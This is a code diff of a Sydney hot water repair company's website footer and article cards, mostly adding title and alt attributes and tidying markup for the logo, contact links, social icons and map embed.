                             <a href="can-you-repair-a-leaking-hot-water-system-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Can you repair a leaking hot water system?
@@ -692,7 +694,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-it-worth-fixing-a-20-year-old-water-heater-326946.jpg?key=zxGPar" alt="Is it worth fixing a 20 year old water heater?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-it-worth-fixing-a-20-year-old-water-heater-326946.jpg?key=WKH1Vi" alt="Is it worth fixing a 20 year old water heater?" class="rounded"
                                  width="80" height="80">
                             <a href="is-it-worth-fixing-a-20-year-old-water-heater.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Is it worth fixing a 20 year old water heater?
@@ -724,14 +726,16 @@
             <div class="row g-lg-3">
                 <div class="col-12 col-lg-7 col-xl-7">
                     <div class="vstack gap-5">
-                        <a class="navbar-brand m-0 gap-2 align-items-center" href="index.html">
-                            <!-- Brand Logo/Mark -->
-                            <img fetchpriority="low" async="true" defer="true"
-                                 display: none " src="logo.png" onerror="this.remove()"
-                            height="100" />
-                            <!-- Brand Name -->
-                            <p class="fs-5 fw-medium">Hot Water Experts Sydney</p>
-                        </a>
+                        <div class="d-inline-flex gap-2 align-items-center">
+                            <a class="navbar-brand m-0 gap-2 align-items-center" href="index.html">
+                                <!-- Brand Logo/Mark -->
+                                <img alt="Hot Water Experts Sydney" fetchpriority="low" async="true" defer="true"
+                                     style="display: inherit" src="logo.png" onerror="this.remove()"
+                                     height="100" />
+                                <!-- Brand Name -->
+                                <p class="fs-5 fw-medium">Hot Water Experts Sydney</p>
+                            </a>
+                        </div>
 
                         <div style="display: ">
                             <strong>Address:</strong>
@@ -741,14 +745,14 @@
                         <div style="display: ">
                             <strong>Contact:</strong>
                             <p class="mb-0">
-                                <a href="tel:+18001234567">0490 414 794</a>
+                                <a href="tel:0490 414 794" title="Contact Number">0490 414 794</a>
                                 <br>
-                                <a style="display: " href="mailto:info@hotwaterexpertssydney.com.au">info@hotwaterexpertssydney.com.au</a>
+                                <a style="display: " title="Email Address" href="mailto:info@hotwaterexpertssydney.com.au">info@hotwaterexpertssydney.com.au</a>
                             </p>
                         </div>
 
                         <div class="d-inline-flex gap-4" style="display: none">
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href=""  title="Facebook Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-facebook" viewBox="0 0 16 16">
                                     <path
@@ -756,14 +760,14 @@
                                 </svg>
                             </a>
 
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Instagram Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-instagram" viewBox="0 0 16 16">
                                     <path
                                             d="M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.9 3.9 0 0 0-1.417.923A3.9 3.9 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.9 3.9 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.9 3.9 0 0 0-.923-1.417A3.9 3.9 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599s.453.546.598.92c.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.5 2.5 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.5 2.5 0 0 1-.92-.598 2.5 2.5 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233s.008-2.388.046-3.231c.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92s.546-.453.92-.598c.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92m-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217m0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334" />
                                 </svg>
                             </a>
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Twitter Link" title="Twitter Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-twitter-x" viewBox="0 0 16 16">
                                     <path
@@ -771,7 +775,7 @@
                                 </svg>
                             </a>
 
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Pinterest Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-pinterest-x" viewBox="0 0 496 512">
                                     <path d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3 .8-3.4 5-20.3 6.9-28.1 .6-2.5 .3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/>
@@ -780,7 +784,7 @@
                             </a>
 
 
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Youtube Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor"
                                      class="bi bi-youtube" viewBox="0 0 16 16">
                                     <path
@@ -795,9 +799,8 @@
                     <div class="row">
                         <div class="col-12 col-lg-12 align-self-center">
                             <div class="card h-50 border-0 p-0 bg-section-light" style="display: ">
-                                <iframe
-                                        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3311.0481185021067!2d151.03226627667377!3d-33.91416112141155!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6b12bdaa28c01eaf%3A0xc5ab587e68ecf3f5!2sHot%20water%20experts%20sydney%20%7C%20Hot%20water%20repair%20%7C%20Emergency%20hot%20water%20repair%20%7C%20Hot%20water%20system%20installation!5e0!3m2!1sen!2sau!4v1720431946895!5m2!1sen!2sau"
-                                        class="border-0 rounded" height="340" allowfullscreen="" loading="lazy"
+                                <iframe title="Locate Us"
+                                        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3311.0481185021067!2d151.03226627667377!3d-33.91416112141155!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6b12bdaa28c01eaf%3A0xc5ab587e68ecf3f5!2sHot%20water%20experts%20sydney%20%7C%20Hot%20water%20repair%20%7C%20Emergency%20hot%20water%20repair%20%7C%20Hot%20water%20system%20installation!5e0!3m2!1sen!2sau!4v1720431946895!5m2!1sen!2sau" class="border-0 rounded" height="340" allowfullscreen="" loading="lazy"
                                         referrerpolicy="no-referrer-when-downgrade"></iframe>
                             </div>
                         </div>
@@ -812,7 +815,6 @@
                 <a href="privacy.html" class="text-start" style="display: inherit">Privacy Policy</a>
                 <a href="terms.html" class="text-center mx-md-4" style="display: inherit">Terms of Service</a>
                 <a href="sitemap.html" class="text-center mx-md-4" style="display: inherit">Sitemap</a>
-
             </div>
         </div>
     </div>
